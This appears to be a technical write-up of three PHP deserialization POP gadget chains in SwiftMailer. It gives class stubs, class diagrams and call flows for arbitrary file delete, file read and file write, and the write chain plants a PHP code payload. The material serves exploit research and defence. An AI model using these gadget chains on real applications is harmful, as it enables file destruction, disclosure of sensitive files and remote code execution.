# SwiftMailer POP Chains

## 1. File Delete

- Gadgets:

    ```php
    <?php
    class Swift_ByteStream_TemporaryFileByteStream extends Swift_ByteStream_FileByteStream {
        public function __construct($path) {
            parent::__construct($path);
        }
    }

    class Swift_ByteStream_FileByteStream {
        private $path;
        public function __construct($path) {
            $this->path = $path;
        }
    }
    ```

- Abstract views: 

    ```mermaid
    classDiagram
        class Swift_ByteStream_TemporaryFileByteStream {
            +__construct($path)
            +__destruct()
        }
        note for Swift_ByteStream_TemporaryFileByteStream "__construct($path): parent::__construct($path)\n__destruct(): @unlink($this->getPath())"

        class Swift_ByteStream_FileByteStream {
            -$path
            +__construct($path, $writable = false)
            +getPath()
        }
        Swift_ByteStream_FileByteStream <|-- Swift_ByteStream_TemporaryFileByteStream
    ```

- Object after `unserialize`

    <p align="center"> <img src="/img/php-deserialization/obj1.png"></p>

- Flow when trigger POP chain by triggering `Swift_ByteStream_TemporaryFileByteStream->__destruct()`

    ```mermaid
    flowchart TD
        A["Swift_ByteStream_TemporaryFileByteStream.__destruct"] -- (1) --> B["@unlink($this.getPath())"]
        B -- (2) --> C["@unlink(Swift_ByteStream_FileByteStream.getPath())"]
        C -- (3) --> D["@unlink(Swift_ByteStream_FileByteStream.path)"]
    ```

## 2. File Read

- Gadgets:

    ```php
    <?php

    class Swift_Mime_SimpleMimeEntity {
        private $headers;
        private $body;
        private $cache;
        private $encoder;
        private $maxLineLength;
        private $cacheKey;

        public function __construct($path) {
            $this->headers       = new Swift_Mime_Headers_OpenDKIMHeader();
            $this->body          = new Swift_ByteStream_FileByteStream($path);
            $this->cache         = new Swift_KeyCache_ArrayKeyCache();
            $this->encoder       = new Swift_Mime_ContentEncoder_PlainContentEncoder();
            $this->cacheKey      = "anykey";
            $this->maxLineLength = 100;
        }
    }

    class Swift_EmbeddedFile extends Swift_Mime_SimpleMimeEntity {
        public function __construct($path) {
            parent::__construct($path);
        }
    }

    class Swift_Mime_Headers_OpenDKIMHeader {
        private $fieldName;
        function __construct() {
            $this->fieldName = "any";
        }
    }

    class Swift_KeyCache_ArrayKeyCache {}

    class Swift_Mime_ContentEncoder_PlainContentEncoder {
        private $canonical = true;
    }

    class Swift_ByteStream_FileByteStream {
        private $path;
        function __construct($path) {
            $this->path = $path;
        }
    }
    ```

- Abstract views:

    ```mermaid
    classDiagram

    class Swift_EmbeddedFile {
        +parent::__construct($path)
        +getBody()
        +__toString()
        +toString(): $this->headers->toString() . $this->bodyToString()
        +bodyToString(): $this->encoder->encodeString($this->getBody(), 0, $this->getMaxLineLength()) 
        +getBody(): $this->readStream($this->body)
    }

    class Swift_Mime_SimpleMimeEntity {
        -$headers
        -$body
        -$cache
        -$encoder
        -$maxLineLength
        -$cacheKey
        +__construct($path)
    }
    class Swift_ByteStream_FileByteStream {
        -$path
        +__construct($path)
    }
    class Swift_Mime_Headers_OpenDKIMHeader {
        -$fieldName
        +__construct()
        +toString() $this.fieldName.': '.$this.value
    }
    class Swift_KeyCache_ArrayKeyCache {
        
    }
    class Swift_Mime_ContentEncoder_PlainContentEncoder {
        -$canonical = true
    }
    Swift_EmbeddedFile --|> Swift_Mime_SimpleMimeEntity 
    Swift_Mime_SimpleMimeEntity --|> Swift_Mime_Headers_OpenDKIMHeader : $headers
    Swift_Mime_SimpleMimeEntity --|> Swift_ByteStream_FileByteStream : $body
    Swift_Mime_SimpleMimeEntity --|> Swift_KeyCache_ArrayKeyCache : $cache
    Swift_Mime_SimpleMimeEntity --|> Swift_Mime_ContentEncoder_PlainContentEncoder : $encoder

    ```

- Flow when trigger POP chain by triggering `Swift_EmbeddedFile->__toString()`
    
    ```mermaid
    flowchart TD
        A["Swift_EmbeddedFile.__toString()"] -- (1:1) --> A1["Swift_EmbeddedFile.headers.toString()"]
        A -- (2:1) --> A2["Swift_EmbeddedFile.bodyToString()"]

        A1  -- (1:2) --> A1B["Swift_Mime_Headers_OpenDKIMHeader.toString()"]
        A1B -- (1:3) --> A1C["Swift_Mime_Headers_OpenDKIMHeader.fieldName . Swift_Mime_Headers_OpenDKIMHeader.value"]
        A1C -- (1:4) --> A1D["'any'"]

        A2  -- (2:2) --> A2B["Swift_EmbeddedFile.getBody()"]
        A2B -- (2:3) --> A2C["Swift_EmbeddedFile.readStream(Swift_EmbeddedFile.body)"]
        A2C -- (2:4) --> A2D["Swift_ByteStream_FileByteStream.read(Swift_ByteStream_FileByteStream.path)"]
        A2D -- (2:5) --> A2E["fread('/path/to/file')"]

        A1D -- (3) --> B["'any' . fread('/path/to/file')"]
        A2E -- (3) --> B
    ```

### 3. File Write

- Gadgets:

    ```php
    class Swift_ByteStream_FileByteStream extends Swift_ByteStream_AbstractFilterableInputStream{}

    class Swift_Events_SimpleEventDispatcher{}
    
    class Swift_Transport_SendmailTransport {
        public $buffer;
        public $started;
        public $eventDispatcher;
    }

    abstract class Swift_ByteStream_AbstractFilterableInputStream {
        private $filters = [];
        private $writeBuffer = '<?php phpinfo();?>//';
    }
    ```

- Abstract views:

    ```mermaid
    classDiagram
    class Swift_Transport_SendmailTransport{
        +$buffer
        +$started: true
        +$eventDispatcher
        +__destruct(): this->stop()
        +stop()
        +executeCommand(): this->buffer->write($command)
    }

    class Swift_ByteStream_FileByteStream{
        -$path: "path/to/file"
        -$mode
        +write()
        +doWrite()
    }

    class Swift_Events_SimpleEventDispatcher{
        +createTransportChangeEvent()
        +dispatchEvent()
    }
    
    class Swift_ByteStream_AbstractFilterableInputStream{
        $filters
        $writeBuffer: "payload_write_to_path"
    }

    Swift_Transport_SendmailTransport --|> Swift_Events_SimpleEventDispatcher: $eventDispatcher
    Swift_Transport_SendmailTransport --|> Swift_ByteStream_FileByteStream: $buffer
    Swift_ByteStream_FileByteStream --|> Swift_ByteStream_AbstractFilterableInputStream: $writeBuffer
    
    ```

- Flow when trigger POP chain by triggering `Swift_Transport_SendmailTransport->__destruct()`

    ```mermaid
    flowchart TD
        A["Swift_Transport_SendmailTransport.__destruct()"] -- (1) --> B["Swift_Transport_SendmailTransport.stop()"]
        B -- (2) --> C["Swift_Transport_SendmailTransport.executeCommand()"]
        C -- (3) --> D["Swift_ByteStream_FileByteStream.write()"]
        D -- (4) --> E["Swift_ByteStream_FileByteStream.doWrite()"]
        E -- (5) --> F["fwrite(Swift_ByteStream_FileByteStream.getWriteHandle, Swift_ByteStream_FileByteStream.writeBuffer)"]
    ```
